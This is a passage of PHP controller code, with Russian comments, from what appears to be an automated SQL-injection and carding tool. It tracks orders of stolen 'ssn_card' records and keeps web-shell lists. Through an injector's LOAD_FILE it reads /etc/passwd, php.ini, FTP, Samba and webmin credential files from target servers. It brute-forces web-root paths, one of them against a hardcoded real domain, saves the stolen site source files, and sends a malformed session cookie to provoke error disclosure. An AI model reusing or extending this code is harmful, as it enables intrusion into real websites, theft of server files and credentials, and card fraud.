			$order_id = $d['ssn']['id'];
			
			
			$p[$i]['post_id'][] = 	$d['ssn']['post_id'];
			$p[$i]['id'][] = 		$d['ssn']['id'];
			$p[$i]['bd'][] = 		$d['ssn']['bd'];
			$p[$i]['table'][] = 	$d['ssn']['table'];
			$p[$i]['column'][] = 	$d['ssn']['column'];
			$p[$i]['shema'][] = 	$d['ssn']['shema'];
			$p[$i]['count'][] = 	$d['ssn']['count'];
			$p[$i]['count_new'][] = 	$d['ssn']['count_new'];
			$p[$i]['count_new2'][] = 	$d['ssn']['count_new2'];
			$p[$i]['count_n'][] = 	$d['ssn']['count_n'];
			$p[$i]['domen'][] =  	$d['ssn']['domen'];
			$p[$i]['column_16'][] = $d['ssn']['column_16'];
			$p[$i]['date'][] = 		$d['ssn']['date'];
			$p[$i]['date_new'][] = 		$d['ssn']['date_new'];
			$p[$i]['color'][] = 	$d['ssn']['color'];
			
			
			//$p[$i]['url'][] = 		$d['ssn']['url'];
			
			
			
			$g2 = $this->Post->query("SELECT * FROM  `ssn_card` WHERE order_id=".$order_id."");
			
			$g3 =  $this->Post->query("SELECT * FROM  `posts` WHERE id=".$post_id);
			
			//$this->d("SELECT * FROM  `posts` WHERE id=".$post_id,'$g3');
			//exit;
			//$this->d($g2,"SELECT * FROM  `ssn_card` WHERE order_id='".$order_id."'");
			
			
				
			//$this->d($d,'$d');
			//$this->d($g3,"SELECT * FROM  `posts` WHERE domen like '%{$domen}'");
			
			
				
			
			
			
			
			
			
			foreach($g2 as $g23){
				
				
				$p[$i]['ssn_card'][] = $g23['ssn_card'];
			}
			
			
			$p[$i]['url'][] = $g3[0]['posts']['url'];
			$p[$i]['alexa'][] =		 $g3[0]['posts']['alexa'];
			$p[$i]['pr'][] =   		 $g3[0]['posts']['pr'];
			$p[$i]['country'][] =    $g3[0]['posts']['country'];
			//$this->d($p );
			//exit;
			
			
			
			$i++;
			
			
		}
		
		//$this->d($p,'data');
		
		$this->set('data',$p);
		
	}
	
	
	function order_domens(){//отображение таблицы c картами больше 50 значения которых
		
		
		$this->s();
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Post->query("SELECT * FROM  `domens` WHERE status =2 order by `id`  DESC");
		}else{
			$data = $this->Post->query("SELECT * FROM  `domens` WHERE status =2 order by `id` DESC");
		}
		
		
	//	$data = $this->Post->query("SELECT * FROM  `domens` WHERE `bad` !=1 AND `status` =2 order by `date` DESC");
		
		
		
		$p = array();
		
		
		
		//$this->d($data,'data');
		//exit;
		$i = 1;
		
		foreach($data as $d)
		{
			
		
			
	
			$p[$i]['id'][] = 			$d['domens']['id'];
			$p[$i]['domen'][] = 		$d['domens']['domen'];
			$p[$i]['domen_new'][] = 	$d['domens']['domen_new'];
			$p[$i]['status'][] = 		$d['domens']['status'];
			$p[$i]['find'][] = 			$d['domens']['find'];
			$p[$i]['http'][] = 			$d['domens']['http'];
			$p[$i]['get_url'][] = 		$d['domens']['get_url'];
			$p[$i]['post_url'][] =  	$d['domens']['post_url'];
			$p[$i]['date'][] = 			$d['domens']['date'];
			
			
			$id = $d['domens']['id'];
			$domen = $d['domens']['domen'];
			$domen_new = $d['domens']['domen_new'];
			
			
			
			$g23 =  $this->Post->query("SELECT * FROM  `posts_all` WHERE domen like '%{$domen}'");
			//$this->d("SELECT * FROM  `posts_all` WHERE domen like '%{$domen}'");
			//$this->d($g23,"23");
			//exit;
			
			$p[$i]['links_domen'] = 		$g23;
			
		
			
			
			//$p[$i]['links_domen']['id'] = 			$g23['posts_all']['id'];
			//$p[$i]['links_domen']['bd'] = 			$g23['posts_all']['bd'];
			//$p[$i]['links_domen']['url'] = 			$g23['posts_all']['url'];
			//$p[$i]['links_domen']['status'] = 		$g23['posts_all']['status'];
			//$p[$i]['links_domen']['find'] = 			$g23['posts_all']['find'];
			//$p[$i]['links_domen']['path_query'] = 	$g23['posts_all']['path_query'];
			//$p[$i]['links_domen']['header'] = 		$g23['posts_all']['header'];
			//$p[$i]['links_domen']['http'] = 		    $g23['posts_all']['http'];
			//$p[$i]['links_domen']['domen'] =  		$g23['posts_all']['domen'];
			//$p[$i]['links_domen']['date'] = 			$g23['posts_all']['date'];
			//$p[$i]['links_domen']['date'] = 			$g23['posts_all']['get_type'];
			//$p[$i]['links_domen']['alexa'] =		 	$g23['posts_all']['alexa'];
			//$p[$i]['links_domen']['pr'] =   		 	$g23['posts_all']['pr'];
			//$p[$i]['links_domen']['country'] =    	$g23['posts_all']['country'];
			
			
			
			
			$i++;
			
			
		}
		
		//$this->d($p,'data');
		//exit;
		$this->set('data',$p);
		
	}
	
	function order_domens_bad(){//отображение таблицы c картами больше 50 значения которых
		
		
		$this->s();
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Post->query("SELECT * FROM  `domens` WHERE `status` =1 or `bad`=1 order by `id` DESC");
		}else{
			$data = $this->Post->query("SELECT * FROM  `domens` WHERE `status` =1 or `bad`=1 order by `date` DESC");
		}
		
		
	//	$data = $this->Post->query("SELECT * FROM  `domens` WHERE `bad` !=1 AND `status` =2 order by `date` DESC");
		
		
		
		$p = array();
		
		
		
		//$this->d($data,'data');
		//exit;
		$i = 1;
		
		foreach($data as $d)
		{
			
		
			
	
			$p[$i]['id'][] = 			$d['domens']['id'];
			$p[$i]['domen'][] = 		$d['domens']['domen'];
			$p[$i]['domen_new'][] = 	$d['domens']['domen_new'];
			$p[$i]['status'][] = 		$d['domens']['status'];
			$p[$i]['find'][] = 			$d['domens']['find'];
			$p[$i]['http'][] = 			$d['domens']['http'];
			$p[$i]['get_url'][] = 		$d['domens']['get_url'];
			$p[$i]['post_url'][] =  	$d['domens']['post_url'];
			$p[$i]['date'][] = 			$d['domens']['date'];
			
			
			$id = $d['domens']['id'];
			$domen = $d['domens']['domen'];
			$domen_new = $d['domens']['domen_new'];
			
			
			
			$g23 =  $this->Post->query("SELECT * FROM  `posts_all` WHERE domen like '%{$domen}'");
			//$this->d("SELECT * FROM  `posts_all` WHERE domen like '%{$domen}'");
			//$this->d($g23,"23");
			//exit;
			
			$p[$i]['links_domen'] = 		$g23;
			
		
			
			
			//$p[$i]['links_domen']['id'] = 			$g23['posts_all']['id'];
			//$p[$i]['links_domen']['bd'] = 			$g23['posts_all']['bd'];
			//$p[$i]['links_domen']['url'] = 			$g23['posts_all']['url'];
			//$p[$i]['links_domen']['status'] = 		$g23['posts_all']['status'];
			//$p[$i]['links_domen']['find'] = 			$g23['posts_all']['find'];
			//$p[$i]['links_domen']['path_query'] = 	$g23['posts_all']['path_query'];
			//$p[$i]['links_domen']['header'] = 		$g23['posts_all']['header'];
			//$p[$i]['links_domen']['http'] = 		    $g23['posts_all']['http'];
			//$p[$i]['links_domen']['domen'] =  		$g23['posts_all']['domen'];
			//$p[$i]['links_domen']['date'] = 			$g23['posts_all']['date'];
			//$p[$i]['links_domen']['date'] = 			$g23['posts_all']['get_type'];
			//$p[$i]['links_domen']['alexa'] =		 	$g23['posts_all']['alexa'];
			//$p[$i]['links_domen']['pr'] =   		 	$g23['posts_all']['pr'];
			//$p[$i]['links_domen']['country'] =    	$g23['posts_all']['country'];
			
			
			
			
			$i++;
			
			
		}
		
		//$this->d($p,'data');
		//exit;
		$this->set('data',$p);
		
	}
	
	
	function shelltest2(){ //вывод на экран количества шелов
		
		
		if($this->local_shells==true){
			$original = file('local_shells.txt');
		}else{
			$original = file('goodshelllist.txt');
		}
		
		
		//$original = array_unique($original);
		$original = array_filter($original);
		shuffle($original);
		//echo 'bez testa shelli';
		$this->serv = $original;
		
		$this->set('serv',$this->serv);
        $this->set('max_shell',$this->max_shell);
		
	}
	
	function terms(){ //Правила
		
		
		
		
		$this->set('serv',123);
		
	}
	
	function prav(){ //Изменения
		
		$this->set('serv',123);
		
	}
	
	
	
	////////////////////////////////
	////////// ONE SEARCH //////////
	////////////////////////////////
	
	function search_system($id){
		
		
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		
		//$this->Session->write('inject',$data);
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		$domen = $squle['Post']['domen'];
		

		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	

		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		
		
		$this->workup();
		
		
		
		$path[] = "/etc/passwd";
		$path[] = "/etc/crontab";
		$path[] = "/etc/hosts";
		$path[] = "/etc/my.cnf";
		$path[] = "/.bash_history";
		$path[] = "/.htpasswd";
		$path[] = "/.htaccess";
		$path[] = "/etc/.htpasswd";
		$path[] = "/root/.bash_history";
		$path[] = "/etc/named.conf";
		$path[] = "/proc/self/environ";
		$path[] = "/etc/php.ini";
		$path[] = "/bin/php.ini";
		$path[] = "/etc/httpd/php.ini";
		$path[] = "/usr/lib/php.ini";
		$path[] = "/usr/lib/php/php.ini";
		$path[] = "/usr/local/etc/php.ini";
		$path[] = "/usr/local/lib/php.ini";
		$path[] = "/usr/local/php/lib/php.ini";
		$path[] = "/usr/local/php4/lib/php.ini";
		$path[] = "/usr/local/php5/lib/php.ini";
		$path[] = "/usr/local/apache/conf/php.ini";
		$path[] = "/etc/php4.4/fcgi/php.ini";
		$path[] = "/etc/php4/apache/php.ini";
		$path[] = "/etc/php4/apache2/php.ini";
		$path[] = "/etc/php5/apache/php.ini";
		$path[] = "/etc/php5/apache2/php.ini";
		$path[] = "/etc/php/php.ini";
		$path[] = "/usr/local/apache/conf/modsec.conf";
		$path[] = "/var/cpanel/cpanel.config";
		$path[] = "/proc/self/environ";
		$path[] = "/proc/self/fd/2";
		$path[] = "/etc/ssh/sshd_config";
		$path[] = "/var/lib/mysql/my.cnf";
		$path[] = "/etc/mysql/my.cnf";
		$path[] = "/etc/my.cnf";
		$path[] = "/etc/logrotate.d/proftpd";
		$path[] = "/www/logs/proftpd.system.log";
		$path[] = "/var/log/proftpd";
		$path[] = "/etc/proftp.conf";
		$path[] = "/etc/protpd/proftpd.conf";
		$path[] = "/etc/vhcs2/proftpd/proftpd.conf";
		$path[] = "/etc/proftpd/modules.conf";
		$path[] = "/etc/vsftpd.chroot_list";
		$path[] = "/etc/vsftpd/vsftpd.conf";
		$path[] = "/etc/vsftpd.conf";
		$path[] = "/etc/chrootUsers";
		$path[] = "/etc/wu-ftpd/ftpaccess";
		$path[] = "/etc/wu-ftpd/ftphosts";
		$path[] = "/etc/wu-ftpd/ftpusers";
		$path[] = "/usr/sbin/pure-config.pl";
		$path[] = "/usr/etc/pure-ftpd.conf";
		$path[] = "/etc/pure-ftpd/pure-ftpd.conf";
		$path[] = "/usr/local/etc/pure-ftpd.conf";
		$path[] = "/usr/local/etc/pureftpd.pdb";
		$path[] = "/usr/local/pureftpd/etc/pureftpd.pdb";
		$path[] = "/usr/local/pureftpd/sbin/pure-config.pl";
		$path[] = "/usr/local/pureftpd/etc/pure-ftpd.conf";
		$path[] = "/etc/pure-ftpd.conf";
		$path[] = "/etc/pure-ftpd/pure-ftpd.pdb";
		$path[] = "/etc/pureftpd.pdb";
		$path[] = "/etc/pureftpd.passwd";
		$path[] = "/etc/pure-ftpd/pureftpd.pdb";
		$path[] = "/usr/ports/ftp/pure-ftpd/";
		$path[] = "/usr/ports/net/pure-ftpd/";
		$path[] = "/usr/pkgsrc/net/pureftpd/";
		$path[] = "/usr/ports/contrib/pure-ftpd/";
		$path[] = "/var/log/ftp-proxy";
		$path[] = "/etc/logrotate.d/ftp";
		$path[] = "/etc/ftpchroot";
		$path[] = "/etc/ftphosts";
		$path[] = "/etc/smbpasswd";
		$path[] = "/etc/smb.conf";
		$path[] = "/etc/samba/smb.conf";
		$path[] = "/etc/samba/samba.conf";
		$path[] = "/etc/samba/smb.conf.user";
		$path[] = "/etc/samba/smbpasswd";
		$path[] = "/etc/samba/smbusers";
		$path[] = "/var/lib/pgsql/data/postgresql.conf";
		$path[] = "/var/postgresql/db/postgresql.conf";
		$path[] = "/etc/ipfw.conf";
		$path[] = "/etc/firewall.rules";
		$path[] = "/etc/ipfw.rules";
		$path[] = "/usr/local/etc/webmin/miniserv.conf";
		$path[] = "/etc/webmin/miniserv.conf";
		$path[] = "/usr/local/etc/webmin/miniserv.users";
		$path[] = "/etc/webmin/miniserv.users";
		$path[] = "/etc/squirrelmail/config/config.php";
		$path[] = "/etc/squirrelmail/config.php";
		$path[] = "/etc/httpd/conf.d/squirrelmail.conf";
		$path[] = "/usr/share/squirrelmail/config/config.php";
		$path[] = "/private/etc/squirrelmail/config/config.php";
		$path[] = "/srv/www/htdos/squirrelmail/config/config.php";
		 

		
		$this->d($path,'$path');
		//exit;
		
		
		
		

		
		foreach($path as $conf_new2)
		{
			
			$load_f_new = $this->mysqlInj->load_file($conf_new2);
			
			//$load_f_new = $this->mysqlInj->load_file_local($conf_new2);
			
			if($load_f_new !='')
			{
				$this->d($load_f_new,"$conf_new2");	
				//return true;
				$kk = 'yes';
				
			}
			//exit;
			
		}
		
		if($kk !='yes'){
			$this->d('httpd не нашел');
			
		}
		
		
		
		
		
		
		//$this->Session->write('inject',$data);
		//$this->set('data',$data);		
		//$this->render('orderone');
		die();	

		
	}
	
	function search_path($id){
		
		
		
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		
		//$this->Session->write('inject',$data);
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		if($this->domen !='')
		{
			$domen = $this->domen;
		}else
		{
			$domen = $squle['Post']['domen'];
		}
		
		

		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	

		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		$post_id = $data['posts_one']['id'];
		
		if($squle['Post']['path1'] !='' AND $squle['Post']['path1'] !='0')
		{
			$path1 = $squle['Post']['path1'];
			$path2[] =$squle['Post']['path1'] ;
			
		}
		
		if($squle['Post']['path2'] !='' AND $squle['Post']['path2'] !='0')
		{
			$path2 = $squle['Post']['path2'];
			$path2[] =$squle['Post']['path2'] ;
			
		}
		
		if($squle['Post']['path3'] !='' AND $squle['Post']['path3'] !='0')
		{
			$path3 = $squle['Post']['path3'];
			$path2[] =$squle['Post']['path3'] ;
			
		}
		
		$this->workup();
		
		$domen = 'junan.webnode.tw';
        //www.passngo.com.tw
		
        $domen2 = str_replace('www.','',$domen);
        
		$path2[] = "/data/www/{$domen}/";
        $path2[] = "/data/www/{$domen2}/";
		$path2[] = "/www/{$domen}/";
        $path2[] = "/www/{$domen2}/";
		$path2[] = "/domains/{$domen}/";
        $path2[] = "/domains/{$domen2}/";
		$path2[] = "/domains/public_html/{$domen}/";
        $path2[] = "/domains/public_html/{$dome2}/";
		$path2[] = "/public_html/{$domen}/";
        $path2[] = "/public_html/{$domen2}/";
		$path2[] = "/public_html/";
		$path2[] = "/{$domen}/";
        $path2[] = "/{$domen2}/";
		
		$path2[] = "/var/www/html/";
		$path2[] = "/var/www/html/{$domen}/";
        $path2[] = "/var/www/html/{$domen2}/";
		$path2[] = "/etc/httpd/";
		$path2[] = "/etc/httpd/{$domen}/";
        $path2[] = "/etc/httpd/{$domen2}/";
		$path2[] = "/var/www/{$domen}/data/www/{$domen}/";
        $path2[] = "/var/www/{$domen2}/data/www/{$domen2}/";
		$path2[] = "/home/www/user/sites/{$domen}/htdocs/";
        $path2[] = "/home/www/user/sites/{$domen2}/htdocs/";
		$path2[] = "/space/home/clients/websites/w_80200/{$domen}/public_html/";
        $path2[] = "/space/home/clients/websites/w_80200/{$domen2}/public_html/";
		$path2[] = "/var/www/virtual_client/ridel-holding/www/";
		$path2[] = "/var/www/hq/data/www/{$domen}/";
        $path2[] = "/var/www/hq/data/www/{$domen2}/";
		$path2[] = "/var/www/vhosts/{$domen}/httpdocs/";
        $path2[] = "/var/www/vhosts/{$domen2}/httpdocs/";
		$path2[] = "/home/admin/data/www/{$domen}/";
        $path2[] = "/home/admin/data/www/{$domen2}/";
		$path2[] = "/usr/local/www/apache22/data/{$domen}/";
        $path2[] = "/usr/local/www/apache22/data/{$domen2}/";
		$path2[] = "/usr/local/www/lib/";
		$path2[] = "/home/users/domains/{$domen}/";
        $path2[] = "/home/users/domains/{$domen2}/";
		$path2[] = "/var/www/html/hosts/{$domen}/cgi-bin/";
        $path2[] = "/var/www/html/hosts/{$domen2}/cgi-bin/";
		$path2[] = "/var/www/vhosts/{$domen}/httpdocs/";
        $path2[] = "/var/www/vhosts/{$domen2}/httpdocs/";
		$path2[] = "/home/users/user/domains/{$domen}/";
        $path2[] = "/home/users/user/domains/{$domen2}/";
		$path2[] = "/srv/www/{$domen}/";
        $path2[] = "/srv/www/{$domen2}/";
		$path2[] = "/{$domen}/";
        $path2[] = "/{$domen2}/";
		$path2[] = "/var/www/html/domain/{$domen}/";
		$path2[] = "/usr/home/{$domen}/htdocs/";
		$path2[] = "/home/{$domen}/domains/{$domen}/public_html/";
		$path2[] = "/usr/home/www/{$domen}/htdocs/";
		$path2[] = "/www/vhosts/{$domen}/html/";
		$path2[] = "/home/{$domen}/public_html/";
		$path2[] = "/var/www/virtual_client/burdin/www/";
		$path2[] = "/home/opt/{$domen}/www/forum/html/";
		$path2[] = "/var/www/admin/data/www/{$domen}/";
		$path2[] = "usr/local/zend/apache2/htdocs/";
		$path2[] = "usr/local/zend/apache2/{$domen}/";
        
        $path2[] = "/var/www/html/domain/{$domen2}/";
		$path2[] = "/usr/home/{$domen2}/htdocs/";
		$path2[] = "/home/{$domen}/domains/{$domen2}/public_html/";
		$path2[] = "/usr/home/www/{$domen2}/htdocs/";
		$path2[] = "/www/vhosts/{$domen2}/html/";
		$path2[] = "/home/{$domen2}/public_html/";
		$path2[] = "/var/www/virtual_client/burdin/www/";
		$path2[] = "/home/opt/{$domen2}/www/forum/html/";
		$path2[] = "/var/www/admin/data/www/{$domen2}/";
		$path2[] = "usr/local/zend/apache2/htdocs/";
		$path2[] = "usr/local/zend/apache2/{$domen2}/";
		
		
		
		//$this->d($path,'$path');
		//exit;
		
		
		
		
		$etc_passwd = $this->mysqlInj->load_passwd();
		//$this->d($etc_passwd,'$etc_passwd');
		
		
		
		foreach($etc_passwd as $load_passwd_one)
		{
			$load_passwd_new[] = $load_passwd_one."/";
			
			
			foreach($path2 as $path_one)
			{
				$str = $load_passwd_one.$path_one;	
				
				$path_new[] = $str;
				//$path_new[]
				
			}
		}
		
		//$this->d($load_passwd_new,'$load_passwd_new');
		//exit;
		
		
		$path_new2 = array_merge($path_new,$load_passwd_new);
		//$this->d($path_new2,'$path_new2');
		
		
		$path_new3 = array_merge($path_new2,$path2);
		$this->d($path_new3,'$path_new3');
		//exit;
		
		
		//$this->d($path_new3,'$path_new3');
       // exit;
		

		if(count($path_new3 ) >1)
		{
			

			$i =1;
			foreach($path_new3 as $conf_new2)
			{
				$url = $conf_new2.'index.php';
                $url2 = $conf_new2.'index.html';
				//$this->d($url,'url');
				$load_f_new = $this->mysqlInj->load_file($url);
                $load_f_new2= $this->mysqlInj->load_file($url2);
				
				
				//$this->d($load_f_new,"$url");	
				//exit;
				
                
                if($load_f_new["LOAD_FILE('$url')"] !='' AND strlen($load_f_new["LOAD_FILE('$url')"]) > 2)
				{
                
					
					$this->d($load_f_new,"$url");	
					
					$path3 = str_replace("index.php",'',$url);
                    
                  
					
					$this->d($path3,'$path3');
					
					mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}", 0777);
					
					$file = "index.".$i.'.txt';
					$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/".$file;
					
					echo "<a  href='/shells/{$domen}/$file' target='_blank'>{$path3}index.php</a>";
					
					file_put_contents($ff,$load_f_new["LOAD_FILE('$url')"]);
					

					
					
					$data2['path'][]=$path3;
					$this->path[] = $path3;
					
					
					
					
					//$this->Session->write('inject',$data2);
					
					
					//$this->Filed->query("UPDATE  `posts_one` SET  `path{$i}` =  '$path',`site{$i}`='$domen' WHERE  `domen` ='$domen'");
					
					//$this->d("UPDATE  `posts_one` SET  `path{$i}` =  '$path',`site{$i}`='$domen' WHERE  `domen` ='$domen'");

					$i++;
					//if($i==5)break;
					
				}	
				
                
                  if($load_f_new2["LOAD_FILE('$url2')"] !='' AND strlen($load_f_new2["LOAD_FILE('$url2')"]) > 2)
				{
                
					
					$this->d($load_f_new,"$url2");	
					
					$path3 = str_replace("index.html",'',$url2);
                    
                  
					
					$this->d($path3,'$path3');
					
					mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}", 0777);
					
					$file = "index.".$i.'.txt';
					$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$domen}/".$file;
					
					echo "<a  href='/shells/{$domen}/$file' target='_blank'>{$path3}index.html</a>";
					
					file_put_contents($ff,$load_f_new2["LOAD_FILE('$url2')"]);
					

					
					
					$data2['path'][]=$path3;
					$this->path[] = $path3;
					
					
					
					
					//$this->Session->write('inject',$data2);
					
					
					//$this->Filed->query("UPDATE  `posts_one` SET  `path{$i}` =  '$path',`site{$i}`='$domen' WHERE  `domen` ='$domen'");
					
					//$this->d("UPDATE  `posts_one` SET  `path{$i}` =  '$path',`site{$i}`='$domen' WHERE  `domen` ='$domen'");

					$i++;
					//if($i==5)break;
					
				}	
				
			}
			
		}
		
		
		
		
		
		
		//$this->Session->write('inject',$data);
		//$this->set('data',$data);		
		//$this->render('orderone');
		//die();	

		
	}
	
	function search_path_cookies($domen){
		
		
		
		$uagent = array(
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial",		  
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)");
		
		///рандомные значения
		//$rand_keys = array_rand ($this->proxy);
		//$s = explode(':',$this->proxy[$rand_keys]);
		$ua = trim($uagent[mt_rand(0,sizeof($uagent)-1)]);	
		
		
		$ch = curl_init();
		
		

		curl_setopt($ch, CURLOPT_URL, 'http://'.$domen);           //url страницы
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //возращаться в файл 
		curl_setopt($ch, CURLOPT_HEADER, 1);           //возвращать заголовки
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   //переходить по ссылками 
		curl_setopt($ch, CURLOPT_ENCODING, "");        //работать с любыми кодировками 
		curl_setopt($ch, CURLOPT_USERAGENT, "1312'][*&//2!)");  	 //useragent
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);  //таймаут соединения 
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);         //тоже самое 
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);       //количество переходов 
		
		curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=aaaaa[256]];'");
		
		$out 	 = curl_exec($ch);
		$err     = curl_errno( $ch );
		$errmsg  = curl_error( $ch );
		$head    = curl_getinfo( $ch );
		
		//$this->d($err,'$err');
		//$this->d($errmsg,'$errmsg');
		//$this->d($out,'$out');
		//$this->d($head,'$head');
		
		if(preg_match("/session_start()/i",$out))
		{
			$this->d($err,'$err');
			$this->d($errmsg,'$errmsg');
			$this->d($out,'$out');
			$this->d($head,'$head');
			
		}else
		{
			echo "Через куки не хочет";
		}
		

		curl_close($ch);

		

		
	}
	
	function search_path_config($id){
		
		
		$time_all=time();
		$time2=10000;
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		
		
		$cards = $this->cards;
		

		unset($data['orders']);
		
		
		//$this->Session->write('inject',$data);
		
		
		
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		
		if(strlen($squle['Post']['sleep']) > 2)
		{
			$set = $squle['Post']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$post_id = $squle['Post']['id'];
		
		$url2 = $squle['Post']['url'];
		
		if($this->domen !='')
		{
			$domen = $this->domen;
		}else
		{
			$domen = $squle['Post']['domen'];
		}
		
		
		
		if($squle['Post']['path1'] !='' AND $squle['Post']['path1'] !='0')
		{
			$path1 = $squle['Post']['path1'];
			$this->path[] =$squle['Post']['path1'] ;
			
		}
		
		if($squle['Post']['path2'] !='' AND $squle['Post']['path2'] !='0')
		{
			$path2 = $squle['Post']['path2'];
			$this->path[] =$squle['Post']['path2'] ;
			
		}
		
		if($squle['Post']['path3'] !='' AND $squle['Post']['path3'] !='0')
		{
			$path3 = $squle['Post']['path3'];
			$this->path[] =$squle['Post']['path3'] ;
			
		}
		
		$this->path = array_unique($this->path);
		$this->d($this->path,'pathh');
		//exit;
		
		//$key = $this->mysqlInj ->inject($squle['Post']['header'].'::'.$squle['Post']['gurl']);
		
		
		//$this->d($this->mysqlInj,'$this->mysqlInj');
		
		
		
		$this->mysqlInj ->inject($squle['Post']['header'].'::'.trim($squle['Post']['gurl']),$data,$set);	
		//$this->d($this->mysqlInj->version,'ver');
		
		//exit;
		
		//$this->d($this->mysqlInj,'data');
		//exit;
		$card='';
		$i=1;
		
		$this->d($pass);
		
		$this->tableOrder='';
		
		
		
		
		$post_id = $data['posts_one']['id'];
		
		
		$this->workup();
		
		
		if(count($this->path) > 0){
			
			$path[] = $this->path;
			$path_new = $this->path;
		}else
		{
			$domen2 = str_replace('www.','',$domen);
        
		$path2[] = "/data/www/{$domen}/";
        $path2[] = "/data/www/{$domen2}/";
		$path2[] = "/www/{$domen}/";
        $path2[] = "/www/{$domen2}/";
		$path2[] = "/domains/{$domen}/";
        $path2[] = "/domains/{$domen2}/";
		$path2[] = "/domains/public_html/{$domen}/";
        $path2[] = "/domains/public_html/{$dome2}/";
		$path2[] = "/public_html/{$domen}/";
        $path2[] = "/public_html/{$domen2}/";
		$path2[] = "/public_html/";
		$path2[] = "/{$domen}/";
        $path2[] = "/{$domen2}/";
		
		$path2[] = "/var/www/html/";
		$path2[] = "/var/www/html/{$domen}/";
        $path2[] = "/var/www/html/{$domen2}/";
		$path2[] = "/etc/httpd/";
		$path2[] = "/etc/httpd/{$domen}/";
        $path2[] = "/etc/httpd/{$domen2}/";
		$path2[] = "/var/www/{$domen}/data/www/{$domen}/";
        $path2[] = "/var/www/{$domen2}/data/www/{$domen2}/";
		$path2[] = "/home/www/user/sites/{$domen}/htdocs/";
        $path2[] = "/home/www/user/sites/{$domen2}/htdocs/";
		$path2[] = "/space/home/clients/websites/w_80200/{$domen}/public_html/";
